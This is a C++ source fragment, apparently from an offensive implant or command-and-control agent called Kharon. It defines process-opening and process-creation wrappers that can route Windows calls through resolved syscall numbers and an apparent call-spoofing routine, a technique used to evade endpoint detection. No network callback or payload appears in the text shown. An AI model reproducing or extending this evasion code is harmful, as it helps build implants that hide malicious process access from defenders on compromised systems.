#include <Kharon.h>

auto DECLFN Process::Open(
    _In_ ULONG RightsAccess,
    _In_ BOOL  InheritHandle,
    _In_ ULONG ProcessID
) -> HANDLE {
    const UINT32 Flags    = Self->Config.Syscall;
    NTSTATUS     Status   = STATUS_UNSUCCESSFUL;
    HANDLE       Handle   = nullptr;
    CLIENT_ID    ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
    OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr) };

    if ( ! Flags ) return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );

    UPTR Address = SYS_ADDR( Sys::OpenProc );
    UPTR ssn     = SYS_SSN( Sys::OpenProc );

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
        (UPTR)&ObjAttr, (UPTR)&ClientID
    );

    Self->Usf->NtStatusToError( Status );

    return Handle;
}

auto Process::Create(
    _In_  WCHAR*                Application,
    _In_  WCHAR*                Command,
    _In_  ULONG                 Flags,
    _In_  LPSECURITY_ATTRIBUTES PsAttributes,
    _In_  LPSECURITY_ATTRIBUTES ThreadAttributes,
    _In_  BOOL                  Inherit,
    _In_  PVOID                 Env,
    _In_  WCHAR*                CurrentDir,
    _In_  STARTUPINFOW*         StartupInfo,
    _Out_ PROCESS_INFORMATION* PsInfo
) -> BOOL {
    if ( Self->Config.Syscall ) {
        return Self->Spf->Call(
           (UPTR)Self->Krnl32.CreateProcessW, 0, (UPTR)Application,
           (UPTR)Command, (UPTR)PsAttributes, (UPTR)ThreadAttributes, Inherit, 
           Flags, (UPTR)Env, (UPTR)CurrentDir, (UPTR)StartupInfo, (UPTR)PsInfo
        );
    }

    return Self->Krnl32.CreateProcessW( Application, Command, PsAttributes, ThreadAttributes, Inherit, Flags, Env, CurrentDir, StartupInfo, PsInfo );
}
